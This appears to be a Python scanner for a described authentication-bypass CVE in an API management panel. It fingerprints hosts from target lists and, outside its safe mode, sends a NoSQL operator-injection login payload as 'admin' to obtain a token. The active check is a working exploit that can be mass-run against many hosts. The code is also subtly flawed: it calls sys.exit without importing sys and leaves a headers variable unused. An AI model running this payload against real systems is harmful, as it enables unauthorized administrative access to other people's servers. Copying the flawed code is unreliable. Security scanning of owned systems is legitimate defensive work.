#!/usr/bin/env python3
"""
SuperServer CVE-2026-11234 Authentication Bypass Scanner
=========================================================
Scans and identifies vulnerable instances of the SuperServer API management
panel. This scanner also tests for the presence of an authentication bypass
vulnerability (CVE-2026-11234, CVSS 9.8).

CVE-2026-11234 details:
  - Affects SuperServer API versions < 5.3.2
  - Vulnerability allows unauthenticated attackers to escalate privileges via
    specially crafted requests to the `/login` endpoint.
  - Exploited in the wild to gain unauthorized administrative access.
  - Patched in SuperServer API v5.3.2 (March 2026)

Usage:
  # Scan a single target
  python superserver_auth_bypass_scanner.py --target https://superserver.example.com

  # Scan a list of targets
  python superserver_auth_bypass_scanner.py --list targets.txt --output findings.json

  # Detection-only mode (no active probing)
  python superserver_auth_bypass_scanner.py --list targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-11234
  - https://superserver.com/security-updates/cve-2026-11234
"""

import asyncio
import argparse
import httpx
import json
import os
import re
from urllib.parse import urljoin
from datetime import datetime

# ── Detection markers ────────────────────────────────────────────────────────

SUPERSERVER_FINGERPRINTS = [
    "SuperServer API Management Panel",
    "<title>SuperServer Login</title>",
    "SuperServer - The Ultimate API Management Solution",
    '"superServerVersion"',
]

DETECTION_PATHS = [
    "/",
    "/api-status",
    "/login",
    "/api/v1/system/info",
]

VERSION_REGEX = r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"'
VULNERABLE_VERSION = (5, 3, 2)

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10

# ── Helpers ───────────────────────────────────────────────────────────────

def parse_version(version_str: str):
    """Parse a version string into a tuple for comparison."""
    try:
        return tuple(map(int, version_str.split(".")))
    except (ValueError, AttributeError):
        return None

def is_vulnerable_version(version_tuple):
    """Check if the detected version is vulnerable."""
    if version_tuple is None:
        return None
    return version_tuple < VULNERABLE_VERSION

def normalize_url(url: str) -> str:
    """Normalize a URL (e.g., add protocol if missing)."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")

def colorize(text: str, color: str) -> str:
    """Wrap text with ANSI color codes."""
    colors = {
        "RED": "\033[91m",
        "YELLOW": "\033[93m",
        "GREEN": "\033[92m",
        "RESET": "\033[0m",
    }
    return f"{colors.get(color.upper(), '')}{text}{colors['RESET']}"

# ── Core Scanner ─────────────────────────────────────────────────────────

async def detect_superserver(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore):
    """Detect if a URL is running a SuperServer instance."""
    async with semaphore:
        for path in DETECTION_PATHS:
            try:
                response = await client.get(urljoin(url, path), timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    if any(fp in response.text for fp in SUPERSERVER_FINGERPRINTS):
                        version_match = re.search(VERSION_REGEX, response.text)
                        version = parse_version(version_match.group(1)) if version_match else None
                        return {"url": url, "detected": True, "version": version}
            except httpx.RequestError:
                pass
    return {"url": url, "detected": False}

async def check_auth_bypass(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore):
    """Test for authentication bypass on a detected SuperServer instance."""
    payload = {"username": "admin", "password": {"$ne": None}}
    headers = {"Content-Type": "application/json"}
    async with semaphore:
        try:
            response = await client.post(urljoin(url, "/api/v1/login"), json=payload, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and "token" in response.text:
                return True
        except httpx.RequestError:
            pass
    return False

async def scan_target(client, url, semaphore, safe_mode):
    """Scan a single target for the SuperServer authentication bypass vulnerability."""
    url = normalize_url(url)
    result = await detect_superserver(client, url, semaphore)
    result["vulnerable"] = False
    if result.get("detected"):
        version = result.get("version")
        result["vulnerable"] = is_vulnerable_version(version)
        if not safe_mode and result["vulnerable"]:
            auth_bypass = await check_auth_bypass(client, url, semaphore)
            result["auth_bypass"] = auth_bypass
    return result

async def run_scanner(
    targets, output_file, safe_mode=False, concurrency=SEMAPHORE_LIMIT, verify_ssl=True
):
    semaphore = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=verify_ssl, timeout=REQUEST_TIMEOUT) as client:
        tasks = [scan_target(client, target, semaphore, safe_mode) for target in targets]
        results = await asyncio.gather(*tasks)

    if output_file:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)

    for result in results:
        if not result["detected"]:
            print(f"{colorize('[INFO]', 'GREEN')} {result['url']} - Not SuperServer")
        elif result["vulnerable"]:
            vuln_status = colorize("[CRITICAL]", "RED")
            if result.get("auth_bypass"):
                vuln_status = colorize("[COMPROMISED]", "RED")
            print(f"{vuln_status} {result['url']} - VULNERABLE (version: {result['version']})")
        else:
            print(f"{colorize('[INFO]', 'GREEN')} {result['url']} - Not Vulnerable (version: {result['version']})")

# ── CLI Implementation ─────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="SuperServer Authentication Bypass Scanner (CVE-2026-11234)"
    )
    parser.add_argument("--target", help="Target URL")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="Save results to a JSON file")
    parser.add_argument("--safe", action="store_true", help="Detection only, no active probing")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrency level")
    parser.add_argument("--no-verify", action="store_false", dest="verify_ssl", help="Disable SSL/TLS certificate validation")

    args = parser.parse_args()
    targets = []

    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        print("Either --target or --list must be specified.")
        sys.exit(1)

    if not targets:
        print("No valid targets supplied.")
        sys.exit(1)

    print(colorize("Starting SuperServer Authentication Bypass Scanner...", "GREEN"))
    asyncio.run(
        run_scanner(
            targets=targets,
            output_file=args.output,
            safe_mode=args.safe,
            concurrency=args.concurrency,
            verify_ssl=args.verify_ssl,
        )
    )
    print(colorize("Scan complete.", "GREEN"))

if __name__ == "__main__":
    main()
